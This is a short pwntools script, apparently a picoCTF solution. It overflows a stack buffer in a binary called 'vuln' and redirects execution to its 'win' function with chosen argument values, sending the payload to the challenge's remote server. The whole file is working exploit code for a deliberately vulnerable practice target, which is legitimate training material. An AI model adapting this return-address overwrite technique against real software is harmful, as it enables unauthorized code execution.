from pwn import *

exe = context.binary = ELF('vuln')
winaddr = exe.symbols['win']
exitaddr = exe.symbols['exit']
io = remote('saturn.picoctf.net', 56812) #exe.process()
#gdb.attach(io)
payload = fit({
    112: winaddr,
    116: exitaddr,
    120: 0xcafef00d,
    124: 0xf00df00d

})

io.recvuntil(b'Please enter your string: \n')
io.sendline(payload)
io.interactive()
flag = io.recvline()